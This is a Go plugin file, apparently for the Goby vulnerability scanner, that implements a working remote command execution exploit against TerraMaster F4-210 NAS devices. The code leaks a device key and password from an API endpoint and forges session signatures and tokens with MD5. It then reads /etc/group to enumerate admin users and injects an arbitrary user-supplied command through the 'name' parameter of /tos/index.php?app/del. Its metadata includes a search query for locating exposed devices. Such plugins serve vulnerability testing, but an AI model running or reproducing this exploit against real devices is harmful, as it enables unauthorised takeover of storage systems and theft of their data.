package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Terramaster F4-210 name RCE",
    "Description": "<p>TerraMaster F2-210 and F4-210 are NAS (Network Attached Storage) devices of Terramaster, Shenzhen, China.</p><p>TerraMaster F2-210 and F4-210 have arbitrary command execution vulnerabilities. Attackers can execute arbitrary codes by forging sessions by leaking sensitive information and gain server permissions.</p>",
    "Impact": "Terramaster F4-210 name RCE",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.terra-master.com/cn/\">https://www.terra-master.com/cn/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "TerraMaster F4-210",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Terramaster 存储设备 F4-210 name 参数远程命令执行漏洞",
            "Description": "<p>TerraMaster F2-210和F4-210是中国深圳市图美电子技术（Terramaster）公司的NAS（网络附属存储）设备。</p><p>TerraMaster F2-210和F4-210存在任意命令执行漏洞，攻击者可通过敏感信息泄露伪造session来执行任意代码，获取服务器权限。</p>",
            "Impact": "<p>TerraMaster F2-210和F4-210存在任意命令执行漏洞，攻击者可通过敏感信息泄露伪造session来执行任意代码，获取服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.terra-master.com/cn/\">https://www.terra-master.com/cn/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "TerraMaster F4-210",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Terramaster F4-210 name RCE",
            "Description": "<p>TerraMaster F2-210 and F4-210 are NAS (Network Attached Storage) devices of Terramaster, Shenzhen, China.</p><p>TerraMaster F2-210 and F4-210 have arbitrary command execution vulnerabilities. Attackers can execute arbitrary codes by forging sessions by leaking sensitive information and gain server permissions.</p>",
            "Impact": "Terramaster F4-210 name RCE",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.terra-master.com/cn/\">https://www.terra-master.com/cn/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "TerraMaster F4-210",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"TOS Loading\"",
    "GobyQuery": "title=\"TOS Loading\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.terra-master.com/cn/",
    "DisclosureDate": "2022-01-04",
    "References": [
        "https://packetstormsecurity.com/files/165399/terramaster-exec.py.txt"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10250"
}`

	tos_encrypt_str := func(key, toencrypt string) string {
		Str1 := key + toencrypt
		return fmt.Sprintf("%x", md5.Sum([]byte(Str1)))
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			Rand1 := 100000 + rand.Intn(100)
			Rand2 := 5000 + rand.Intn(100)
			uri1 := "/module/api.php?mobile/wapNasIPS"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("user-agent", "TNAS")
			cfg1.Header.Store("user-device", "TNAS")
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "PWD") && strings.Contains(resp.RawBody, "ADDR") {
					KeyFind := regexp.MustCompile("\"ADDR\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
					Key1 := KeyFind[1][6:]
					PWDFind := regexp.MustCompile("\"PWD\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
					timestamp1 := fmt.Sprintf("%v", time.Now().Unix())
					signature1 := tos_encrypt_str(Key1, timestamp1)
					kod_token1 := tos_encrypt_str(Key1, "")
					kod_token2 := tos_encrypt_str(Key1, PWDFind[1])
					uri2 := "/module/api.php?mobile/fileDownload"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("user-agent", "TNAS")
					cfg2.Header.Store("user-device", "TNAS")
					cfg2.Header.Store("signature", signature1)
					cfg2.Header.Store("timestamp", timestamp1)
					cfg2.Header.Store("authorization", PWDFind[1])
					cfg2.Header.Store("Cookie", "kod_name=guest; kod_token="+kod_token1)
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg2.Data = `path=%2Fetc%2Fgroup`
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil && resp2.StatusCode == 200 {
						UsersFind := regexp.MustCompile("admin:x:3:(.*?)\n").FindStringSubmatch(resp2.RawBody)
						fmt.Println(UsersFind[1])
						Userlist := strings.Split(UsersFind[1], ",")
						fmt.Println(Userlist)
						for _, i2 := range Userlist {
							uri3 := fmt.Sprintf("/tos/index.php?app/del&id=0&name=;expr%%20%d%%20%%2b%%20%d;xx%%23", Rand1, Rand2)
							cfg3 := httpclient.NewGetRequestConfig(uri3)
							cfg3.VerifyTls = false
							cfg3.FollowRedirect = true
							cfg3.Header.Store("user-agent", "TNAS")
							cfg3.Header.Store("user-device", "TNAS")
							cfg3.Header.Store("signature", signature1)
							cfg3.Header.Store("timestamp", timestamp1)
							cfg3.Header.Store("authorization", PWDFind[1])
							cfg3.Header.Store("Cookie", "kod_name="+i2+"; kod_token="+kod_token2)
							if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil && resp3.StatusCode == 200 && !strings.Contains(resp3.RawBody, "<!--user login-->") {
								return strings.Contains(resp3.RawBody, strconv.Itoa(Rand1+Rand2))
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri1 := "/module/api.php?mobile/wapNasIPS"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("user-agent", "TNAS")
			cfg1.Header.Store("user-device", "TNAS")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "PWD") && strings.Contains(resp.RawBody, "ADDR") {
					KeyFind := regexp.MustCompile("\"ADDR\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
					Key1 := KeyFind[1][6:]
					PWDFind := regexp.MustCompile("\"PWD\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
					timestamp1 := fmt.Sprintf("%v", time.Now().Unix())
					signature1 := tos_encrypt_str(Key1, timestamp1)
					kod_token1 := tos_encrypt_str(Key1, "")
					kod_token2 := tos_encrypt_str(Key1, PWDFind[1])
					uri2 := "/module/api.php?mobile/fileDownload"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("user-agent", "TNAS")
					cfg2.Header.Store("user-device", "TNAS")
					cfg2.Header.Store("signature", signature1)
					cfg2.Header.Store("timestamp", timestamp1)
					cfg2.Header.Store("authorization", PWDFind[1])
					cfg2.Header.Store("Cookie", "kod_name=guest; kod_token="+kod_token1)
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg2.Data = `path=%2Fetc%2Fgroup`
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
						UsersFind := regexp.MustCompile("admin:x:3:(.*?)\n").FindStringSubmatch(resp2.RawBody)
						fmt.Println(UsersFind[1])
						Userlist := strings.Split(UsersFind[1], ",")
						fmt.Println(Userlist)
						for _, i2 := range Userlist {
							uri3 := fmt.Sprintf("/tos/index.php?app/del&id=0&name=;%s;xx%%23", url.QueryEscape(cmd))
							cfg3 := httpclient.NewGetRequestConfig(uri3)
							cfg3.VerifyTls = false
							cfg3.FollowRedirect = true
							cfg3.Header.Store("user-agent", "TNAS")
							cfg3.Header.Store("user-device", "TNAS")
							cfg3.Header.Store("signature", signature1)
							cfg3.Header.Store("timestamp", timestamp1)
							cfg3.Header.Store("authorization", PWDFind[1])
							cfg3.Header.Store("Cookie", "kod_name="+i2+"; kod_token="+kod_token2)
							if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil && !strings.Contains(resp3.RawBody, "<!--user login-->") {
								expResult.Output = resp3.RawBody
								expResult.Success = true
								break
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
